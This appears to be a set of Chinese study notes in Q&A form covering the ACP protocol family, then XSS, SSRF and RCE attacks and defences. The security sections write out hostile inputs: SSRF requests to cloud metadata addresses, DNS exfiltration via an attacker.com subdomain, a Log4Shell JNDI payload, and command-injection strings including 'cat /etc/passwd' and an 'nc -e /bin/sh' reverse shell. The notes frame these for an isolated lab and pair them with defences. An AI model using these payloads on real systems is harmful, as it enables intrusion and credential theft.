ACP 的三种含义与实现生态

2026-11-17
ACPAgent Client ProtocolAgent 互操作ZedSDK
问题原文

ACP 是什么？市面上常见的第三方实现有哪些？

答案要点
  • 三种含义：
    • Agent Client Protocol（Zed 发起，最常用）：编码 Agent 与编辑器/客户端走 JSON-RPC over stdio，一个 Agent 接入即可被任意客户端调用，类比 LSP
    • Agent Communication Protocol（IBM/BeeAI 捐给 Linux 基金会）：Agent 互操作，已被 Google A2A 吸收
    • Agent Context Protocol（AGNTCY/Cisco）：多 Agent 协作的上下文与任务状态共享，概念已被 A2A 吸收
    • 实现生态：
    • 客户端：Zed 官方首发；Neovim（CodeCompanion/avante.nvim/hermes.nvim）、Emacs agent-shell.el、JetBrains、VS Code 扩展、Chrome 扩展、Obsidian 插件
    • Agent 侧：Claude Code、Codex CLI、Gemini CLI、Cursor、Copilot、Goose、Cline、OpenCode、Hermes Agent、OpenClaw 均在官方清单
    • SDK：官方 Python/Rust/TS/Kotlin/Java，社区 Go/Dart/C# 等；配套官方 ACP Registry 一键安装

XSS 与 SSRF 的原理、攻击前提与防御

2026-11-17 · 更新于 2026-11-18
XSSSSRFWeb 安全云元数据内网防护
问题原文

XSS 和 SSRF 分别是什么？SSRF 的攻击前提是什么、能落实到哪些真实场景？

答案要点
  • XSS（跨站脚本）：攻击者把恶意 JS 注入到你信任的页面里执行，借你的登录态干坏事
    • 三种类型：存储型（写进数据库如评论区，危害最大）、反射型（藏在 URL 里骗你点）、DOM 型（前端 JS 直接把输入塞进 HTML）
    • 危害：盗 Cookie/登录态、冒充操作、钓鱼、蠕虫传播
    • 防御：输入转义、输出编码、CSP、HttpOnly、富文本白名单
    • SSRF（服务端请求伪造）：让服务器替攻击者发请求，借服务器的内网身份访问本来够不到的资源
    • 典型例子：「输入网址帮你抓标题」的功能被填入 http://127.0.0.1:8080/admin、http://192.168.1.1/，甚至 169.254.169.254 云元数据接口拿 AK/SK
    • 攻击前提：网站必须有「收用户 URL → 服务端去取」的口子；本质不是骗内网服务（它收到的是真请求），而是欺骗整个信任链——骗外层网站「这是正常请求」+ 借用服务器的网络位置与内网身份
    • 常见场景：内容抓取（剪藏、RSS、竞品价格监控）、富媒体处理（OG 分享卡片、图片转存、网页转 PDF）、开发者工具（Webhook 测试、死链检测、短链 302 跳转）、AI（联网搜索抓网页、RAG 导入 URL 文档）、企业内部（SSO/OAuth 回调、CI/CD 拉仓库）
    • 防御：URL 白名单、禁内网/回环/元数据地址（含 DNS Rebinding 校验）、限制跳转跟随、出网统一走代理、云上强制 IMDSv2
  • 更新：2026-11-18（SSRF 第 2 轮 · XSS 第 2 轮深入）
    • SSRF 第 2 轮（真实案例 / 回显外带 / 接口预知 / 最终目的）：
    • 真实案例：Capital One（2019）——攻击者向收 URL 的功能填 169.254.169.254 元数据接口拿 AWS 临时密钥（AK/SK），列 S3 桶拖走 1 亿用户数据，起点仅一个 URL；同类：GitLab SSRF CVE 系列、WordPress pingback 内网探测
    • 回显疑问澄清：「响应发不回攻击者」是误解——非盲 SSRF 靠漏洞功能本身回显（剪藏存正文、链接预览、PDF 渲染，漏洞网站就是攻击者的镜子）；盲 SSRF 也有外带通道（URL 写成 <数据>.attacker.com 靠 DNS 解析日志外带，Burp Collaborator 原理；或响应时间侧信道探测端口）
    • 接口预知：多数场景不需要——云元数据/Redis/K8s API 是默认地址默认路径背下来就能打；未知接口可用被利用功能先扫 127.0.0.1 各端口或靠报错回显摸索
    • 最终目的总结：偷凭据（元数据 AK/SK）、读内网页面、触发内部操作（灌 Redis 计划任务/调内部删除接口）、当跳板进内网——「只要让服务器替我调一下」本身就是破坏
    • XSS 第 2 轮（注入点清单 / 与油猴对比）：
    • 注入点本质不是写进网站 JS 文件，而是「输入被当成代码执行的地方」：URL 参数/哈希（反射型、DOM 型）、表单输入存库（存储型，一次注入全体中招最值钱）、HTTP 头（UA/Referer 在日志后台触发）、DOM 汇点（innerHTML/document.write/eval/setTimeout 字符串）、文件上传（SVG/HTML 直开）、富文本编辑器过滤不严
    • 与油猴（Tampermonkey）的区别：相似点都是让 JS 在网页里跑；本质不同——油猴是用户自装扩展、授权运行、合法功能；XSS 是借漏洞塞进别人页面、受害者不知情时以该网站身份执行（偷 Cookie/冒充操作/钓鱼）。比喻：油猴是正门进来的访客，XSS 是顺没关好的窗户爬进来的小偷

RCE 的定义、典型案例、代码投放渠道与本地靶场实操

2026-11-18
RCE远程代码执行Log4Shell反序列化DVWA
问题原文

RCE（远程代码执行）是什么意思？有哪些典型案例？想本地模拟攻击链路加深理解该怎么做？恶意代码一般通过什么渠道投放到目标机器上？

答案要点
  • 定义：RCE = Remote Code Execution（远程代码执行），也写作 Remote Command Execution——攻击者无需物理接触或登录目标系统，通过网络（Web 接口、服务端口）在目标机器执行任意代码或系统命令的高危漏洞类型，常直接导致服务器被完全控制
    • 典型案例：
    • Log4Shell（CVE-2021-44228）：Log4j2 JNDI 注入，一行日志打穿，全球海量 Java 应用，「核弹级」
    • Struts2（CVE-2017-5638）：Equifax 因此泄露 1.47 亿人数据，损失超 7 亿美元
    • EternalBlue（MS17-010）：NSA 泄露的 SMB 漏洞，WannaCry 勒索蠕虫横扫 150+ 国家
    • Shellshock（CVE-2014-6271）：Bash 环境变量注入，Web/CGI/路由器通杀
    • Fastjson / Log4j 反序列化系列：国内 Java 生态高频供应链 RCE
    • 共同特征：入口多为「不可信输入 → 解析/反序列化/命令拼接」，危害都是服务器完全沦陷
    • 代码投放渠道（关键认知修正：多数 RCE 的「代码」不是上传的文件，而是夹在正常请求里被漏洞组件自己捞出来执行——所以才难防）：
    • 请求直接携带（最常见）：HTTP 参数/头/Body 夹命令或代码片段，如 DVWA ping 框的 1.1.1.1; whoami，走合法业务通道；命令拼接、SQL 注入 xp_cmdshell、SSTI 模板注入均此路
    • 文件上传 + 解析：传 webshell（php/jsp）或图片马再访问触发，前提是有上传点且解析没拦
    • 动态加载/反序列化（最优雅）：Log4Shell 一行日志 ${jndi:ldap://evil/a} 让目标程序自己去远程拉字节码进内存——全程不落盘纯内存执行；Fastjson 同理
    • 供应链投毒：恶意 npm/pip/maven 包在 install 阶段执行，随依赖「合法」进来
    • 公开漏洞 PoC 直接打：调用漏洞现成利用（Struts2、EternalBlue）
    • 入口三类总结：业务输入点、上传/解析点、程序自己往外取东西的点；防御对位：输入白名单、上传隔离、禁动态外联/反序列化、依赖审计
    • 本地模拟攻击链路（合法靶场 + 完整链路，⚠️ 仅自建隔离环境）：
    • 靶场任选：Docker + Vulhub（Log4Shell/Struts2/Fastjson 一键复现，最快）；Kali + Metasploitable 2（VM 隔离，最经典）；DVWA Command Injection 模块（攻击面最小最直观）
    • 链路五步（以 DVWA 命令注入为例）：①侦察找输入点 → ②探测 127.0.0.1; whoami 验证命令拼接 → ③; cat /etc/passwd 确认 RCE → ④; nc -e /bin/sh 反弹 shell 本地接住 → ⑤后渗透提权/横移/持久化
    • 工具：Burp Suite 改包、netcat 接 shell、Metasploit 半自动利用
    • 防御对照：每步攻击映射一条防御——输入白名单/参数化调用/禁 exec/最小权限/命令审计
